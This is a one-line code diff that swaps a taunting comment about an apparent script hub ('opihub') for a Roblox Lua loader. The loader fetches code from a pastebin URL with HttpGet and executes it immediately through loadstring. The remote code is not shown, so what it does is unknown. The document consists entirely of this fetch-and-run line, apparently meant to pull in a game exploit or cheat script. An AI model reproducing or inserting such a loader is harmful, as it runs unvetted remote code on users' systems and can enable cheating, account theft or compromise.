@@ -1,1 +1,1 @@
-# opihub_noskid_bozo_eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+loadstring(game:HttpGet("https://pastebin.com/aqXmqBjV"))();
